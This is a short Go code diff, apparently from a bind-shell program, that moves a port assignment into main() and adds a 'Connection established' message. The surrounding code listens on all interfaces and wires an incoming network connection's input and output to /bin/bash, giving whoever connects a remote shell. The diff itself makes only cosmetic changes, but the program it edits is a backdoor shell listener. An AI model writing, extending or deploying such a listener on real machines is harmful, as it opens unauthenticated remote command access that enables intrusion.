@@ -13,11 +13,11 @@ var host string = "0.0.0.0"
 var port string
 
 func main() {
+	port = "62" + getPort(0, "")
 	do()
 }
 
 func do() {
-	port = "62" + getPort(0, "")
 	fmt.Println("Listening on port " + port)
 	shell()
 }
@@ -50,6 +50,7 @@ func shell() {
 			do()
 			return
 		}
+		fmt.Println("Connection established")
 		cmd := exec.Command("/bin/bash")
 		//Set input/output to the established connection's in/out
 		cmd.Stdin = con
